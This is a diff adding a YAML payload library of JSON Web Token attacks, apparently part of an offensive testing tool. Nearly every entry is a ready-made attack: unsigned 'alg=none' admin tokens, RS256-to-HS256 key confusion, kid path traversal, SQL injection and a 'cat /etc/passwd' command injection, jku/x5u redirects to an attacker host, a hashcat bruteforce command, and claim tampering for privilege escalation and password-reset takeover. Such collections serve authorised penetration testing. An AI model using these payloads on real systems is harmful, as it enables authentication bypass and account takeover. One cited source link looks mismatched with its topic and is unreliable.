@@ -1,0 +1,226 @@
+id: jwt_attacks
+name: JWT Attacks
+version: 1.0.0
+category: auth
+description: |
+  Attack payloads against JSON Web Tokens: alg=none, key confusion (RS256 -> HS256
+  with public key as secret), kid path-traversal and SQLi, jku/x5u host
+  redirection, embedded JWK injection, and weak secret bruteforce setups.
+mitre:
+  - T1556
+  - T1078
+owasp_top10:
+  - A07:2021
+  - A02:2021
+references:
+  - https://portswigger.net/web-security/jwt
+  - https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+  - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20171130_JWT_Survival_Guide.pdf
+related_tools:
+  - jwt-tool
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: alg_none
+    name: alg=none header
+    subcategory: alg_confusion
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.
+    notes: Some libs accept unsigned tokens with empty signature
+    source: https://portswigger.net/web-security/jwt/algorithm-confusion-attacks
+  - id: alg_none_case_variant
+    name: alg=NoNe case bypass
+    subcategory: alg_confusion
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"NoNe","typ":"JWT"}.{"sub":"admin"}.
+    notes: Mixed case bypasses string == "none" checks
+    source: https://portswigger.net/web-security/jwt/algorithm-confusion-attacks
+  - id: rs256_to_hs256
+    name: RS256 -> HS256 key confusion
+    subcategory: alg_confusion
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      Header: {"alg":"HS256","typ":"JWT"}
+      Sign with the application's PEM public key used as the HMAC secret.
+    notes: Classic library confusion
+    source: https://www.howmanydaysuntilchristmas.net/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/
+  - id: kid_path_traversal
+    name: kid path traversal to /dev/null
+    subcategory: kid_injection
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"HS256","kid":"../../../../dev/null"}
+    notes: HMAC with empty key = signature of empty file
+    source: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+  - id: kid_sqli
+    name: kid SQL injection
+    subcategory: kid_injection
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"HS256","kid":"key' UNION SELECT 'aaa'-- -"}
+    notes: HMAC secret becomes 'aaa'; sign accordingly
+    source: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+  - id: kid_command_injection
+    name: kid command injection
+    subcategory: kid_injection
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: high
+    payload: |
+      {"alg":"HS256","kid":"key|cat /etc/passwd"}
+    notes: Some libs shell out on kid
+    source: common knowledge
+  - id: jku_redirect
+    name: jku to attacker key
+    subcategory: jku_x5u
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"RS256","jku":"https://attacker.example.net/jwks.json"}
+    notes: Host attacker JWKS containing matching kid
+    source: https://portswigger.net/web-security/jwt/algorithm-confusion-attacks
+  - id: jku_host_header_trick
+    name: jku trusted-host redirect
+    subcategory: jku_x5u
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"RS256","jku":"https://target.example.net@attacker.example.net/jwks"}
+    notes: For startsWith host checks
+    source: https://portswigger.net/web-security/jwt
+  - id: x5u_attacker_cert
+    name: x5u attacker certificate
+    subcategory: jku_x5u
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"RS256","x5u":"https://attacker.example.net/cert.pem"}
+    notes: null
+    source: https://portswigger.net/web-security/jwt
+  - id: jwk_embedded
+    name: Embedded JWK self-signed
+    subcategory: jwk
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"RS256","jwk":{"kty":"RSA","n":"<attacker_n>","e":"AQAB"}}
+    notes: Sign with attacker private key; some libs trust embedded jwk
+    source: https://portswigger.net/web-security/jwt
+  - id: weak_secret_bruteforce
+    name: Weak HMAC secret bruteforce
+    subcategory: weak_secret
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: high
+    payload: |
+      hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
+    notes: For HS256 tokens
+    source: https://hashcat.net/wiki/doku.php?id=example_hashes
+  - id: empty_signature
+    name: Empty signature
+    subcategory: alg_confusion
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: high
+    payload: |
+      <header>.<payload>.
+    notes: Some libs accept tokens with empty signature segment
+    source: common knowledge
+  - id: psychic_signatures
+    name: Psychic signatures (CVE-2022-21449)
+    subcategory: alg_confusion
+    encoding: raw
+    tech_targets: [java, jwt]
+    severity_when_works: critical
+    payload: |
+      Use ECDSA signature with both r and s set to 0 in DER form (Java 15-18)
+    notes: null
+    source: https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
+  - id: claim_tamper_role
+    name: Claim tampering - role
+    subcategory: claim_tamper
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: high
+    payload: |
+      Change "role":"user" to "role":"admin" in payload before resigning
+    notes: Combine with alg_none/key confusion
+    source: common knowledge
+  - id: claim_tamper_exp
+    name: Claim tampering - exp
+    subcategory: claim_tamper
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: medium
+    payload: |
+      Set "exp":9999999999 to prevent expiry
+    notes: null
+    source: common knowledge
+  - id: header_inject_typ
+    name: typ=JWE downgrade
+    subcategory: alg_confusion
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: medium
+    payload: |
+      {"alg":"none","typ":"JWE"}
+    notes: Some libs default to unverified parsing for JWE
+    source: common knowledge
+  - id: replay_old_token
+    name: Replay old token after rotation
+    subcategory: replay
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: medium
+    payload: |
+      Submit previously valid token after key rotation; some apps still trust old kid
+    notes: null
+    source: common knowledge
+  - id: nuclei_jwt_template
+    name: nuclei jwt scan
+    subcategory: tool_invoke
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: high
+    payload: |
+      jwt_tool <token> -M at -t https://target.example.net/api
+    notes: jwt_tool all-tests mode
+    source: https://github.com/ticarpi/jwt_tool
+  - id: kid_dirtraversal_known_file
+    name: kid traversal to known file
+    subcategory: kid_injection
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: critical
+    payload: |
+      {"alg":"HS256","kid":"../../../../etc/hostname"}
+    notes: Sign with file contents as secret
+    source: common knowledge
+  - id: blank_password_reset
+    name: Blank-password reset token
+    subcategory: claim_tamper
+    encoding: raw
+    tech_targets: [jwt]
+    severity_when_works: high
+    payload: |
+      Modify "email" claim in password-reset JWT to victim address
+    notes: null
+    source: common knowledge
